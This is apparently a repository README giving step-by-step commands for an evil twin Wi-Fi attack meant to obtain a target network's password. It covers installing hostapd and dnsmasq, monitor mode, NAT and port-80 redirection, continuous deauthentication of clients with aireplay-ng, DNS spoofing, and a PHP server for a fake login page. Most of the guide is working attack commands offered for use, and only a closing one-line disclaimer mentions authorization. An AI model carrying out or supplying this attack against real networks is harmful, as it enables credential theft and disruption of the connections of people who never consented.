
# Evil Twin Attack Guide

This guide explains how to conduct an evil twin attack to obtain the password for a target network.

![](eviltwin.jpg)

*Note: you need a network card capable of packet injection for this attack*

git clone the repo and follow the steps below.

## Step 1: Install required software 

```bash
# Update package lists and install required software 

sudo apt-get update 
sudo apt-get install hostapd dnsmasq apache2 php-cli

```


## Step 2: Configure the network interface

```bash

# Put the wireless interface into monitor mode 
sudo airmon-ng start wlan0 

# Check the monitor mode interface name 
iwconfig

# Bring up the wireless interface and assign an IP address
# CHANGE THE INTERFACE NAME ACCORDINGLY

ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0

# Add a route to the target network
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

# Execute this command to enable IP Forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward


# Configure NAT to allow traffic to pass through the interface
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT

# Redirect traffic to port 80 to the fake AP
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1

# Save the rules
sudo service iptables save

``` 


## Step 3: Find the target network


```bash
# Use airodump-ng to find the target network 

airodump-ng wlan0
```

## Step 4: Deauthenticate clients from the target network

```bash
#Use aireplay-ng to deauthenticate clients from the target network 

sudo aireplay-ng --deauth 0 -a <mac-address-of-target-AP> wlan0

```

## Step 5: Start the attack

*Note: the .conf file are provided in the repo. Make sure you change the interface name and the ssid in these files*

Each of the following commands is to be run on a separate terminal

```bash
# Start the hostapd service with a configuration file 

hostapd hostapd.conf  

# Start the dnsmasq service with a configuration file 

dnsmasq -C dnsmasq.conf -d  

# Start the dnsspoof service on the wireless interface 

dnsspoof -i wlan0mon  

# Start a PHP server on all interfaces listening on port 80 

cd webserver

php -S 0.0.0.0:80

```

Note: This guide is for educational purposes only and should not be used for malicious purposes. It is important to always obtain proper authorization before conducting any security testing.
